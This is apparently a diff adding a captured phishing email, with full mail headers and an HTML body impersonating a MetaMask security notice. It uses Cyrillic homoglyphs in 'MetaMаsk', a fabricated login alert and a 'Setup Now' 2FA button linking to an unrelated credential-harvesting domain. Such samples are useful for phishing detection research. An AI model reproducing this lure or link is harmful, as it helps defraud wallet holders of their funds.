@@ -1,0 +1,75 @@
+Return-Path: <postmaster@88c8d588c6.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id pQcWL4eNO2iWMgAAOB6+FQ
+	(envelope-from <postmaster@88c8d588c6.nxcli.io>)
+	for <info@vorteksenerji.com>; Sun, 01 Jun 2025 02:15:19 +0300
+Return-path: <postmaster@88c8d588c6.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Sun, 01 Jun 2025 02:15:19 +0300
+Received: from cloudhost-2752193.us-west-1.nxcli.net ([173.249.147.112]:29736)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@88c8d588c6.nxcli.io>)
+	id 1uLVQ7-000000002NN-1dyr
+	for info@vorteksenerji.com;
+	Sun, 01 Jun 2025 02:15:19 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=88c8d588c6.nxcli.io;
+  b=Q8Shw5pHeAdJ9oofuDpG85N6WdJLS38TJ/Ypo1wrYjReFnGohoFARkPJn4wtGBW/YP0yFK5BA17PEwsbHsAuUOndxAnkLXG93hvkWFCQRB8062ecXiVTc4W9hca75Ys0Ddz4Wtewi8TGTKnYR2khPvr7shUou0bOGI9N08GgfjVrbTq7I9gGKK3V8c6SYLgZJ3Ecrz0APbTS+60KKHwhI4C0ymDjd5xPaqEFGM0Izu+xiJoEBoOR8AjBeuzkcEuLJmEVnMKWv2/aENqo0vYSmLRJmr1xLlD6mff5W/q+7/fVMKXno9jqeLsfjvL2CZmnquLwLmruaIHcWrC/3AX30A==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type:X-Mailer:X-Priority;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=88c8d588c6.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type; s=default; bh=3rPOmXQlJCqDHKIcpmn1CsE4FU8gxmUTbMa
+	Og9ks/g0=; b=syR7IYxBeIPiI/ogs5Sn/1/M6GQUD7OXCph8GZTbPkJcoe8F/c8
+	MSP85k+LuXbtpnsFusUkLGwdliP2UmCRsWWAmR+HDuSQvlzi4F9pIqxqsfbNBO4x
+	/J6mL8pnQr3GRBNI/xPOcgHVkeKfcvcRT6+LV83DFYB9mh1ZFFTrD4M2Shu7RW7o
+	Yo1njgAgDwsg9vvwp5skFbiwCcNg20lKsEM2JAptiyn7x0lZqhgFSem5I51mRmYu
+	SBPG7vpEVxnT+h2UfbRTrYm6N+4CJwxWIuWCzfglx0fkYsN4YTRanJ0xbp+/HZ7D
+	1r2RXB0gq56SDVA2vzDlrQKmA85NhoIh9OA==
+Received: (qmail 9522 invoked by uid 10174); 31 May 2025 23:14:37 +0000
+Date: 31 May 2025 23:14:37 +0000
+Message-ID: <20250531231437.9517.qmail@cloudhost-2752193.us-west-1.nxcli.net>
+To: info@vorteksenerji.com
+Subject: Lаst Reminder: Security Notification
+X-PHP-Originating-Script: 10174:f.php
+From: "MetaMаsk" <8tarswyc@woa.io>
+Reply-To: 8tarswyc@woa.io
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHP/8.2.20
+X-Priority: 3
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>MetaMаsk Security Notice</title>
+<style>
+  body {margin:0;padding:0;background:#f4f4f7;font-family:Arial,sans-serif;color:#333}
+  .box {max-width:500px;margin:40px auto;background:#fff;border-radius:8px;padding:24px 28px;box-shadow:0 2px 10px #0001}
+  .logo {font-size:38px;margin-bottom:10px;text-align:center}
+  h2 {color:#f6851b;text-align:center;font-size:20px;margin-bottom:20px}
+  p {font-size:15px;line-height:1.6;margin:0 0 18px;text-align:center}
+  .btn {
+    display:inline-block;margin:22px auto;padding:10px 24px;background:#f6851b;
+    color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;font-size:15px
+  }
+  .footer {font-size:12px;color:#777;text-align:center;margin-top:26px}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="logo">🦊</div>
+  <h2>Unusual Login Attempt Detected</h2>
+  <p>We've detected activity from an unfamiliar device on your MetaMаsk wallet.</p>
+  <p>For your protection, we strongly recommend enabling Two-Factor Authentication (2FA).</p>
+  <p><a href="https://kamebellebritishshorthaircattery.com/cpw/?id=5828151801514280274-3825" class="btn">🔐 Setup Now</a></p>
+  <p class="footer">If this was you, no action is needed.<br>— MetaMаsk Security Team</p>
+</div>
+</body>
+</html>
+
